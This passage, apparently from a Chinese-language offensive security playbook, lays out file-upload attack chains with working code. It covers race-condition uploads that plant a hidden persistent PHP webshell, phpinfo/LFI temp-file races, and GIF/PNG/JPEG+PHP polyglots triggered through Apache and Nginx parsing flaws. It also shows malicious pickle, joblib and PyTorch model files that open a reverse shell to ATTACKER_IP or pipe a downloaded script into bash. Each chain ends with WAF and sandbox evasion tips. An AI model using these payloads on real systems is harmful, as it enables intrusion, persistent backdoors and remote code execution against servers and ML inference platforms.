                    'cmd': 'echo PD9waHAgZXZhbCgkX1BPU1RbInBhc3MiXSk7Pz4= | base64 -d > /var/www/html/uploads/.cache.php'
                })
                print('[+] 持久化 webshell 已写入: /uploads/.cache.php')
        except:
            pass

# 启动上传线程（持续上传保持文件存在）
print('[*] 启动竞争条件攻击...')
upload_threads = []
for i in range(30):
    t = threading.Thread(target=upload_shell, daemon=True)
    t.start()
    upload_threads.append(t)

# 短暂等待确保文件已上传
time.sleep(0.5)

# 启动访问线程（在删除窗口内抢答）
access_threads = []
for i in range(50):
    t = threading.Thread(target=access_shell, daemon=True)
    t.start()
    access_threads.append(t)

# 等待成功或超时
timeout = time.time() + 30
while not success and time.time() < timeout:
    time.sleep(0.1)

if not success:
    print('[-] 30秒内未成功，可能窗口太小或路径不对')
else:
    print('[*] 验证持久化 webshell...')
    r = requests.post('http://target.com/uploads/.cache.php', data={'pass': 'system(\"id\");'})
    print(f'    持久化验证: {r.text[:100]}')
"

# === 步骤 3：利用 PHP 临时文件竞争（phpinfo 辅助）===
# 当目标存在 phpinfo() 页面时，可利用 PHP 临时文件路径泄露进行竞争
python3 -c "
import threading
import requests
import re

TARGET = 'http://target.com'
PHPINFO = TARGET + '/phpinfo.php'
UPLOAD = TARGET + '/upload.php'
LFI = TARGET + '/index.php?page='

def find_tmp_file():
    '''从 phpinfo 响应中提取临时文件路径'''
    r = requests.post(PHPINFO, files={'file': ('test.txt', b'test')})
    # phpinfo 会显示 $_FILES 中的 tmp_name
    match = re.search(r'tmp_name.*?(/tmp/php\w+)', r.text, re.DOTALL)
    if match:
        return match.group(1)
    return None

def race_include(tmp_path):
    '''在临时文件被清理前通过 LFI 包含执行'''
    while True:
        r = requests.get(LFI + tmp_path)
        if 'uid=' in r.text:
            print(f'[+] 临时文件竞争成功! 路径: {tmp_path}')
            return True

# 并发上传 + 并发包含
for _ in range(20):
    threading.Thread(target=lambda: find_tmp_file(), daemon=True).start()
    tmp = find_tmp_file()
    if tmp:
        for _ in range(20):
            threading.Thread(target=race_include, args=(tmp,), daemon=True).start()
"

# === 步骤 4：利用大文件延长处理窗口 ===
# 上传大文件使服务端处理时间变长，增大竞争窗口
python3 -c "
import requests, threading

# 生成 50MB 的填充数据 + webshell
# 大文件使 move_uploaded_file 耗时更长
padding = b'A' * (50 * 1024 * 1024)  # 50MB 填充
shell = b'<?php system(\$_GET[\"cmd\"]); ?>'
payload = padding + shell

def upload():
    while True:
        requests.post('http://target.com/upload', 
            files={'file': ('big.php', payload, 'image/jpeg')}, timeout=30)

def access():
    while True:
        r = requests.get('http://target.com/uploads/big.php', params={'cmd': 'id'}, timeout=2)
        if 'uid=' in r.text:
            print(f'[+] 大文件竞争成功: {r.text[:100]}')
            return

for _ in range(10): threading.Thread(target=upload, daemon=True).start()
for _ in range(30): threading.Thread(target=access, daemon=True).start()
"
```

**检测绕过技术**：
- 竞争窗口极小（< 10ms）→ 使用大文件延长 `move_uploaded_file` 处理时间
- 服务端使用原子操作（先写临时目录再 rename）→ 寻找其他可预测路径（如 PHP 临时文件 `/tmp/phpXXXXXX`）
- WAF 检测高频上传 → 使用多 IP 轮换或降低并发但延长持续时间
- 文件名随机化无法预测 → 从上传响应中解析返回的文件路径

---

### 攻击链 4：图片 Polyglot 上传绕过（GIF + PHP）

**场景**：目标应用使用 `getimagesize()` 或 `exif_imagetype()` 校验上传文件是否为真实图片，同时检查文件扩展名是否为图片格式。通过构造同时是合法 GIF 图片和有效 PHP 代码的 polyglot 文件，绕过双重校验，再利用解析漏洞或 .htaccess 触发 PHP 执行。

**前置条件**：
- 服务端使用 `getimagesize()` / `exif_imagetype()` / `finfo_file()` 校验图片真实性
- 存在解析漏洞（Apache mod_mime、Nginx + PHP-FPM 配置不当）或可上传 .htaccess
- 上传目录可被 Web 访问

**分步利用**：

```bash
# === 步骤 1：构造 GIF + PHP polyglot（最简单方式）===
# GIF89a 是最短的图片 Magic Header，PHP 引擎会忽略它前面的非 PHP 内容
echo -ne 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# 验证：getimagesize() 会识别为 GIF
python3 -c "
from PIL import Image
import io
# GIF89a + 任意内容 → getimagesize 返回 GIF 类型
data = b'GIF89a<?php system(\$_GET[\"cmd\"]); ?>'
# 模拟 PHP getimagesize 检测
print(f'文件大小: {len(data)} bytes')
print('Magic bytes: GIF89a → getimagesize 识别为 image/gif')
"

# 上传 polyglot 文件
curl -s -X POST "http://target.com/upload" \
  -F "file=@shell.gif;type=image/gif;filename=shell.gif"

# === 步骤 2：利用 Apache 解析漏洞触发执行 ===
# Apache mod_mime 从右向左解析扩展名
# 如果上传 shell.gif.php → Apache 找到 .php 解析为 PHP
# 如果上传 shell.php.gif → Apache 从右找 .gif（不可识别）→ .php → 解析为 PHP

# 方法 A：双扩展名
curl -s -X POST "http://target.com/upload" \
  -F "file=@shell.gif;type=image/gif;filename=shell.php.gif"
curl -s "http://target.com/uploads/shell.php.gif?cmd=id"

# 方法 B：配合 .htaccess 使 .gif 解析为 PHP
# （参考攻击链 2 上传 .htaccess 后直接访问 .gif）
curl -s "http://target.com/uploads/shell.gif?cmd=id"

# === 步骤 3：构造 PNG + PHP polyglot（更隐蔽）===
# PNG 文件结构：签名 + IHDR + IDAT + IEND
# 在 tEXt 块中嵌入 PHP 代码，文件仍是合法 PNG
python3 -c "
import struct
import zlib

# PNG 签名
png_sig = b'\x89PNG\r\n\x1a\n'

# IHDR 块（1x1 像素，8-bit RGBA）
ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 6, 0, 0, 0)
ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xFFFFFFFF
ihdr = struct.pack('>I', len(ihdr_data)) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)

# tEXt 块嵌入 PHP webshell
# 格式: keyword\0text，keyword 必须为 1-79 字节
php_code = b'Comment\x00<?php system(\$_GET[\"cmd\"]); __halt_compiler();?>'
text_crc = zlib.crc32(b'tEXt' + php_code) & 0xFFFFFFFF
text_chunk = struct.pack('>I', len(php_code)) + b'tEXt' + php_code + struct.pack('>I', text_crc)

# IDAT 块（最小有效图像数据）
raw_data = b'\x00\x00\x00\x00\x00'  # 1像素 RGBA + 过滤字节
compressed = zlib.compress(raw_data)
idat_crc = zlib.crc32(b'IDAT' + compressed) & 0xFFFFFFFF
idat = struct.pack('>I', len(compressed)) + b'IDAT' + compressed + struct.pack('>I', idat_crc)

# IEND 块
iend_crc = zlib.crc32(b'IEND') & 0xFFFFFFFF
iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)

# 组装完整 PNG + PHP polyglot
with open('shell.png', 'wb') as f:
    f.write(png_sig + ihdr + text_chunk + idat + iend)

print('[+] shell.png 创建成功')
print('[+] 通过 getimagesize() 校验: 是')
print('[+] 通过 finfo_file() 校验: 是')
print('[+] PHP 代码位置: tEXt 块')
"

# 上传 PNG polyglot
curl -s -X POST "http://target.com/upload" \
  -F "file=@shell.png;type=image/png;filename=shell.png"

# === 步骤 4：构造 JPEG + PHP polyglot ===
# 利用 exiftool 在 JPEG 的 EXIF Comment 字段嵌入 PHP
# 需要安装 exiftool: apt install libimage-exiftool-perl
exiftool -Comment='<?php system($_GET["cmd"]); __halt_compiler(); ?>' \
  normal.jpg -o shell.jpg

# 上传 JPEG polyglot
curl -s -X POST "http://target.com/upload" \
  -F "file=@shell.jpg;type=image/jpeg;filename=shell.jpg"

# === 步骤 5：利用 Nginx + PHP-FPM 解析漏洞触发执行 ===
# 当 Nginx 配置了 fastcgi_split_path_info 且 cgi.fix_pathinfo=1
# 访问 /uploads/shell.gif/anything.php → Nginx 将 shell.gif 当作 PHP 执行
curl -s "http://target.com/uploads/shell.gif/test.php?cmd=id"
curl -s "http://target.com/uploads/shell.png/.php?cmd=id"
curl -s "http://target.com/uploads/shell.jpg/x.php?cmd=id"

# === 步骤 6：自动化 polyglot 上传 + 执行验证 ===
python3 -c "
import requests

target_upload = 'http://target.com/upload'
upload_base = 'http://target.com/uploads/'

# polyglot 文件构造
polyglots = {
    # GIF polyglot
    'shell.gif': b'GIF89a<?php system(\$_GET[\"cmd\"]); ?>',
    # PNG polyglot（简化版）
    'shell.png': b'\x89PNG\r\n\x1a\n' + b'\x00' * 50 + b'<?php system(\$_GET[\"cmd\"]); ?>',
}

# 触发执行的方式
trigger_methods = [
    # 方法 1：直接访问（需要 .htaccess 或 Apache 解析漏洞）
    lambda fn: upload_base + fn,
    # 方法 2：Nginx path_info 解析
    lambda fn: upload_base + fn + '/test.php',
    # 方法 3：双扩展名
    lambda fn: upload_base + fn.replace('.gif', '.php.gif').replace('.png', '.php.png'),
    # 方法 4：%00 截断
    lambda fn: upload_base + fn + '%00.php',
]

for fn, content in polyglots.items():
    # 上传
    files = {'file': (fn, content, 'image/' + fn.split('.')[-1])}
    r = requests.post(target_upload, files=files)
    print(f'[*] 上传 {fn}: {r.status_code}')
    
    # 尝试各种触发方式
    for method in trigger_methods:
        url = method(fn)
        r = requests.get(url, params={'cmd': 'id'})
        if 'uid=' in r.text:
            print(f'[+] 执行成功! URL: {url}')
            print(f'    输出: {r.text[:100]}')
            break
"
```

**检测绕过技术**：
- 服务端使用 `getimagesize()` + 扩展名白名单 → GIF89a 头 + .gif 扩展名 + Nginx path_info 解析
- 服务端重新生成图片（GD/Imagick 重绘）→ polyglot 中的 PHP 代码会被清除，需寻找不重绘的上传点
- WAF 检测文件内容中的 `<?php` → 使用短标签 `<?=` 或 `<script language="php">` 绕过
- 服务端检查图片尺寸/像素 → 确保 polyglot 包含有效的 IHDR 和 IDAT 块

---

### 攻击链 5：2026 AI 模型文件上传 RCE（pickle / joblib 反序列化）

**场景**：目标是一个 AI/ML 推理服务或模型托管平台，允许用户上传机器学习模型文件（`.pkl`、`.joblib`、`.pt`、`.gguf`）。利用 Python pickle/joblib 的反序列化漏洞，在模型文件中嵌入恶意 payload，当服务端加载模型时触发任意命令执行。

**前置条件**：
- 目标允许上传模型文件（`.pkl`、`.joblib`、`.pt`、`.h5`、`.gguf`）
- 服务端使用 `pickle.load()`、`joblib.load()`、`torch.load()` 加载用户模型
- 加载过程未使用安全反序列化（如 `torch.load(weights_only=True)`）

**分步利用**：

```bash
# === 步骤 1：构造恶意 pickle 模型文件 ===
python3 -c "
import pickle
import os

class MaliciousModel:
    '''伪装为 ML 模型的恶意类'''
    def __init__(self):
        self.model_name = 'innocent_model'
        self.accuracy = 0.99
    
    def __reduce__(self):
        # pickle 反序列化时调用 os.system 执行任意命令
        # __reduce__ 返回 (callable, args) → 反序列化时执行 callable(*args)
        return (os.system, ('id > /tmp/pwned',))

# 序列化恶意模型
with open('malicious_model.pkl', 'wb') as f:
    pickle.dump(MaliciousModel(), f)

print('[+] malicious_model.pkl 创建成功')
print('[+] 当目标执行 pickle.load() 时触发 os.system(\"id > /tmp/pwned\")')
"

# === 步骤 2：构造反弹 shell 的 pickle payload ===
python3 -c "
import pickle
import base64

class RCEModel:
    def __reduce__(self):
        # 反弹 shell 命令
        cmd = 'bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"'
        return (exec, (\"import os; os.system('\" + cmd + \"')\",))

with open('reverse_shell.pkl', 'wb') as f:
    pickle.dump(RCEModel(), f)

print('[+] reverse_shell.pkl 创建成功')
print('[+] 加载时触发反弹 shell 到 ATTACKER_IP:4444')
"

# === 步骤 3：构造恶意 joblib 模型文件（更常用格式）===
python3 -c "
import joblib
import os

class EvilPipeline:
    '''伪装为 sklearn Pipeline 的恶意对象'''
    def __init__(self):
        self.steps = [('classifier', None)]
        self.classes_ = [0, 1]
    
    def __reduce__(self):
        return (os.system, ('curl http://ATTACKER_IP/sh | bash',))

# joblib 是 pickle 的压缩封装，反序列化时同样触发 __reduce__
joblib.dump(EvilPipeline(), 'evil_model.joblib', compress=3)

print('[+] evil_model.joblib 创建成功')
print('[+] joblib.load() 时触发 os.system 命令')
"

# === 步骤 4：构造恶意 PyTorch 模型文件 ===
python3 -c "
# CVE-2025-32434: PyTorch torch.load() 默认不安全
# 在 PyTorch < 2.6 中，torch.load() 使用 pickle 反序列化
# 攻击者可在 .pt 文件中嵌入恶意 pickle payload

import pickle
import io
import struct

class TorchRCE:
    def __init__(self):
        # 伪装为 PyTorch state_dict 的元数据
        self._metadata = {'version': '2.0'}
    
    def __reduce__(self):
        return (exec, (\"import os; os.system('id > /tmp/torch_pwned')\",))

# PyTorch .pt 文件格式: magic + pickle 数据
# 构造恶意 .pt 文件
buf = io.BytesIO()
# PyTorch magic number
buf.write(b'PK\x03\x04')  # ZIP magic（PyTorch 使用 ZIP 容器）
# 嵌入恶意 pickle 数据
pickle.dump(TorchRCE(), buf)
buf.seek(0)

with open('malicious_model.pt', 'wb') as f:
    f.write(buf.read())

print('[+] malicious_model.pt 创建成功')
print('[+] torch.load() 时触发命令执行（CVE-2025-32434）')
"

# === 步骤 5：上传恶意模型到目标推理服务 ===
# 上传 pickle 模型
curl -s -X POST "http://target.com/api/models/upload" \
  -F "model=@malicious_model.pkl;type=application/octet-stream" \
  -F "name=test_model" \
  -F "framework=sklearn"

# 上传 joblib 模型
curl -s -X POST "http://target.com/api/models/upload" \
  -F "model=@evil_model.joblib;type=application/octet-stream" \
  -F "name=test_model" \
  -F "framework=sklearn"

# 上传 PyTorch 模型
curl -s -X POST "http://target.com/api/models/upload" \
  -F "model=@malicious_model.pt;type=application/octet-stream" \
  -F "name=test_model" \
  -F "framework=pytorch"

# === 步骤 6：触发模型加载（执行 payload）===
# 大多数推理服务在模型上传后自动加载，或通过 API 触发加载
curl -s -X POST "http://target.com/api/models/load" \
  -H "Content-Type: application/json" \
  -d '{"model_name": "test_model", "framework": "sklearn"}'

# 或者通过推理请求触发加载
curl -s -X POST "http://target.com/api/predict" \
  -H "Content-Type: application/json" \
  -d '{"model_name": "test_model", "input": [[1.0, 2.0, 3.0]]}'

# === 步骤 7：监听反弹 shell ===
# 在攻击者机器上执行
nc -lvnp 4444

# === 步骤 8：自动化检测脚本 ===
python3 -c "
import requests
import pickle
import os
import tempfile

target = 'http://target.com/api/models'

# 生成检测用 pickle（写入标记文件而非反弹 shell，避免实际危害）
class Detector:
    def __reduce__(self):
        return (os.system, ('echo VULNERABLE > /tmp/pickle_test',))

# 序列化
buf = tempfile.NamedTemporaryFile(suffix='.pkl', delete=False)
pickle.dump(Detector(), buf)
buf.close()

# 上传
files = {'model': ('test.pkl', open(buf.name, 'rb'), 'application/octet-stream')}
data = {'name': 'security_test', 'framework': 'sklearn'}
r = requests.post(f'{target}/upload', files=files, data=data)
print(f'[*] 上传响应: {r.status_code} - {r.text[:100]}')

# 触发加载
r = requests.post(f'{target}/load', json={'model_name': 'security_test'})
print(f'[*] 加载响应: {r.status_code}')

# 注意：实际验证需要在目标服务器上检查 /tmp/pickle_test 是否存在
# 或使用 DNS 外带方式确认
print('[*] 如目标存在漏洞，/tmp/pickle_test 文件将被创建')
print('[*] 可通过 DNS 外带确认: os.system(\"nslookup attacker.com\")')

os.unlink(buf.name)
"
```

**检测绕过技术**：
- 服务端使用 `torch.load(weights_only=True)`（PyTorch 2.6+ 默认）→ 绕过受限，但 `weights_only` 仍允许部分 pickle 操作，可利用 `persistent_load` 钩子
- 服务端使用 `safetensors` 格式 → safetensors 不支持代码执行，需寻找其他加载路径（如自定义数据集加载器）
- WAF 检测 pickle opcode → 使用 `pickletools` 自定义 opcode 序列，或使用 base64 编码 payload 后在 `__reduce__` 中解码执行
- 服务端沙箱限制 `os.system` → 使用 `subprocess.Popen` 或 `__builtins__.__import__` 绕过

**2026 CVE 引用**：
- CVE-2025-32434：PyTorch `torch.load()` 默认不安全反序列化，CVSS 9.8。PyTorch < 2.6 默认允许任意代码执行
- CVE-2026-5760：SGLang 推理框架加载恶意 GGUF 模型时，`chat_template` 字段触发 Jinja2 SSTI → RCE，CVSS 9.8
- 2026 趋势：HuggingFace Hub 等模型托管平台成为攻击重点，恶意模型文件作为 APT 持久化载体
